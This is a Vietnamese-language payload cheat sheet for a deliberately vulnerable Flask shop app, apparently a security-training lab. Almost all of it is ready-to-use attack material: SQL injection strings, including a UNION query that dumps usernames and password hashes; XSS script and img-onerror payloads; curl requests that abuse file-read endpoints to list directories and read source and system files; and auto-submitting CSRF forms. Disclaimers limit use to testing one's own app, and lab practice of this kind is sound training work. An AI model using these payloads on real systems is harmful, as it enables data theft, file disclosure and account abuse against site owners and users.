# Payload khai thác lỗ hổng bảo mật Juice Shop Python

## 1. SQL Injection
**Endpoint:** `/products/all-protducs?search=...`

- **Payload cơ bản:**
  ```
  ' OR 1=1 --
  ```
  **Ví dụ:**
  ```
  /products/all-protducs?search=' OR 1=1 --
  ```
  → Trả về toàn bộ sản phẩm.

- **Dump dữ liệu:**
  ```
  ' UNION SELECT 1, username, password_hash, 0, 0, '/static/images/orange-juice.jpg', '2024-01-01' FROM users--
  ```
  → Có thể hiển thị username và password_hash của user.
   
---

## 2. XSS Reflection
### a. Profile
**Endpoint:** `/profile`
- **Payload (điền vào ô Tên, Địa chỉ, Số điện thoại):**
  ```html
  <script>alert('XSS')</script>
  ```
  → Sau khi lưu, sẽ hiện popup khi load lại trang profile.

### b. Tìm kiếm sản phẩm
**Endpoint:** `/products/all-protducs?search=...`
- **Payload:**
  ```html
  "><img src=x onerror=alert('XSS')>
  ```
  → Khi không tìm thấy sản phẩm, sẽ hiện popup.

---

## 3. Path Traversal

### Bước 1: Liệt kê thư mục hiện tại để xác định cấu trúc

**Gửi request:**
```sh
curl -X POST http://localhost:5000/api/api/list-directory \
  -H "Content-Type: application/json" \
  -d "{\"path\": \".\"}"
```

**Kết quả mẫu:**
```json
{
  "files": [
    "app.py",
    "config.py",
    "data",
    "app",
    "requirements.txt",
    ...
  ]
}
```
> **Giải thích:**
> Bạn sẽ thấy các file và thư mục trong thư mục làm việc hiện tại của Flask.

---

### Bước 2: Đọc file mã nguồn (ví dụ: app.py)

**Gửi request:**
```sh
curl -X POST http://localhost:5000/api/api/read-file \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"app.py\"}"
```

**Kết quả mẫu:**
```json
{
  "content": "from flask import Flask, render_template, session\nfrom flask_sqlalchemy import SQLAlchemy\n..."
}
```
> **Giải thích:**
> Nếu thành công, bạn sẽ nhận được nội dung file `app.py`.

---

### Bước 3: Đọc file trong thư mục con (ví dụ: data/database.py)

**Gửi request:**
```sh
curl -X POST http://localhost:5000/api/api/read-file \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"data/database.py\"}"
```

**Kết quả mẫu:**
```json
{
  "content": "import sqlite3\nfrom data.connect import get_connection\n..."
}
```

---

### Bước 4: Đọc file hệ thống (ví dụ: file hosts trên Windows)

**Gửi request:**
```sh
curl -X POST http://localhost:5000/api/api/read-file \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"C:/Windows/System32/drivers/etc/hosts\"}"
```

**Kết quả mẫu:**
```json
{
  "content": "127.0.0.1       localhost\n::1             localhost\n..."
}
```

---

### Bước 5: Xử lý lỗi đường dẫn

**Ví dụ lỗi:**
```sh
curl -X POST http://localhost:5000/api/api/read-file \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"../../app.py\"}"
```
**Kết quả:**
```json
{
  "error": "[Errno 2] No such file or directory: '../../app.py'"
}
```
> **Giải thích:**
> Đường dẫn không đúng so với thư mục làm việc của Flask. Hãy dùng đường dẫn tuyệt đối hoặc xác định lại vị trí file bằng cách liệt kê thư mục.

---

**Lưu ý:**
- Luôn kiểm tra cấu trúc thư mục trước khi đọc file.
- Nếu không chắc chắn về đường dẫn, hãy dùng API liệt kê thư mục để dò tìm.
- Không sử dụng vào mục đích xấu, chỉ kiểm thử bảo mật cho chính bạn!

---

## 4. CSRF
**Tạo file HTML, mở bằng trình duyệt khi đã đăng nhập ở tab khác:**

### a. Thêm sản phẩm vào giỏ hàng
```html
<form action="http://localhost:5000/cart/add" method="POST">
  <input type="hidden" name="product_id" value="1">
  <input type="hidden" name="quantity" value="1">
  <input type="submit" value="CSRF Add to Cart">
</form>
<script>document.forms[0].submit();</script>
```

### b. Cập nhật profile
```html
<form action="http://localhost:5000/profile" method="POST">
  <input type="text" name="name" value="<script>alert('CSRF')</script>">
  <input type="text" name="address" value="CSRF Address">
  <input type="text" name="phone" value="123456">
  <input type="submit" value="CSRF Profile">
</form>
<script>document.forms[0].submit();</script>
```

---

> **Lưu ý:**
> - Đổi `localhost:5000` thành domain/port bạn đang chạy app nếu khác.
> - Payload này chỉ dùng cho kiểm thử bảo mật, không sử dụng vào mục đích xấu! 